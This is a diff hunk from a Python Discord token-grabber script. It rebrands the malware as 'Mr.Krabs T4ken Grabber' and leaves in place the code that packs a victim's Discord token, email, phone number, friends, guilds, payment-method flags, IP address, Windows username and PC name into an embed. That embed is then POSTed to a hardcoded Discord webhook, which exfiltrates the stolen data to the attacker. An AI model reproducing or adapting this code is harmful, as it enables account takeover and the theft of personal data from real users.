@@ -194,15 +194,15 @@ def main():
                                 ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nFriends: {friends}\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                             'color': 3092790,
                             'footer': {
-                                'text': "Made by Astraa ・ https://github.com/astraadev"
+                                'text': "🦀 Mr.Krabs T4ken Grabber | Developed By TJ`JuânZ 🍔"
                             },
                             'thumbnail': {
                                 'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                             }
                         }
                     ],
-                    "username": "Grabber",
-                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                    "username": "Mr.Krabs T4ken Grabber",
+                    "avatar_url": "https://cdn.discordapp.com/attachments/1170011264475484323/1345120779662266399/images.jpg?ex=67c364d9&is=67c21359&hm=5e2d99d9d2d39bbe1477ccb9b10d89aa4ce69a258a0c293ccf56f917883ea4bc&"
                 }
 
                 urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1345035116162056276/AZxU_jTlrPesLHXnvgOx3OWjMzr1_KzE0Abj7x1I2-StmjFc1YtFthmcTJ1AFuWnGbPz', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
